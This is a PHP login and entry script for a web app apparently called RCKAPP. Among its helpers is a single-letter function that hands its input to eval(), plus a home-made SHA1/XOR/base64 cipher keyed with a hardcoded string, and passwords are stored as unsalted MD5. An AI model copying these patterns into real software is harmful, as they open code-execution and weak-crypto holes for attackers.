<?php
session_start();
header('Content-type: text/html; charset=utf-8');

session_set_cookie_params(60*60*60);
session_cache_expire(60*60*60);
date_default_timezone_set("PRC");
define('PLATFROM_ROOT', dirname(__FILE__));

define('RCKAPP',true);

require(PLATFROM_ROOT. '/video/class/php/data/db_mysql.php');
require(PLATFROM_ROOT. '/system/database.php');

function H($ABCDE){return sha1($ABCDE);}
function X($a){eval($a);};
function N($FGHI){return strlen($FGHI);}
function S($JKLM,$JLIM){return substr($JKLM,$JLIM,1);}
function B($NOPQ){return base64_decode($NOPQ);}
function A($NOPQ){return base64_encode($NOPQ);}
function M($ABCDD,$ABCDJ){$ABCDL=H($ABCDJ);$ABCDU='';for($ABCDP=0;$ABCDP<N($ABCDD);$ABCDP++){$ABCDU.=S($ABCDD,$ABCDP,1)^S($ABCDL,($ABCDP%N($ABCDL)),1);}return $ABCDU;}
function D($ABCDR,$ABCDZ){$ABCDR=str_replace(' ','+',$ABCDR);$ABCDR=B($ABCDR);$ABCDR=M($ABCDR,$ABCDZ);$ABCDG='';for($ABCDA=0;$ABCDA<N($ABCDR);$ABCDA++){$ABCDG.=(S($ABCDR,$ABCDA++,1)^S($ABCDR,$ABCDA,1));}return $ABCDG;}
function E($ABCDK,$ABCDV){$ABCDC='';while(N($ABCDC)<2*2*2*2*2){$ABCDC.=mt_rand(0,mt_getrandmax());}$ABCDC=H($ABCDC);$ABCDW='';for($ABCDO=0;$ABCDO<N($ABCDK);$ABCDO++){$ABCDW.=S($ABCDC,($ABCDO%N($ABCDC)),1).(S($ABCDC,($ABCDO%N($ABCDC)),1)^S($ABCDK,$ABCDO,1));}return A(M($ABCDW,$ABCDV));}

function en($s){
    return E($s,'RCKAPP');
}
function de($s){
    return D($s,'RCKAPP');
}

$db = new db_mysql();
$db->connect($db_connect_para['hostname'], $db_connect_para['username'], $db_connect_para['password'], $db_connect_para['database'], $db_connect_para['port']);

if(isset($_GET['logout'])){
    session_destroy();
    header('location:index.php');
    die;
}

if(isset($_POST['uid']) && isset($_POST['un']) && preg_match('/^[A-Za-z0-9_]+$/', $_POST['uid'])){
    $sql = sprintf("select * from `users` where `uname`='%s' and `passwd`='%s'", $_POST['uid'], md5($_POST['un']));
    
    $d = $db->getOne($sql);
    echo '<!DOCTYPE html><html><meta charset="utf-8"><head><title>系统登陆</title></head><body>';
    if(count($d)>0){
        
        if($d['status']==0){
            $html = "<script>alert('用户被禁用,请联系管理员');</script>";
            echo ($html);
        }else{
            $_SESSION['i'] = $d['uid'];
            $_SESSION['n']  = $d['uname'];
            $_SESSION['r']  = $d['realname'];
            $_SESSION['d']  = $d['dept'];
            $_SESSION['p']  = $d['power'];
            $_SESSION['s']  = $d['status'];
            if($d['uid']==1 && $d['uname']=='administrator'){
                $_SESSION['isAdmin'] = 1;
            }else{
                $_SESSION['isAdmin'] = 0;
            }
            header('Location: index.php?desktop');
            die;
        }

    }else{
        $html = "<script>alert('用户名或者密码不正确');</script>";
        echo $html;
    }
    echo "</body></html>";

}

if(!isset($_SESSION['i'])){
    require('login.html');
}else{
    $json =  json_decode(substr(file_get_contents('./system/setting.php'),13)) ;
    define('ORG_NAME', $json->org_name);
    define('APP_NAME', $json->app_name);
    define('APP_VERSION', $json->version);

    if(isset($_GET['admin'])){
        //require('./system/header.tpl.php');
        require('./system/admin.php');
        //require('./system/footer.tpl.php');        
    }else{
        require('./system/header.tpl.php');
        require('./system/desktop.php');
        require('./system/footer.tpl.php');        
    }

}
?>
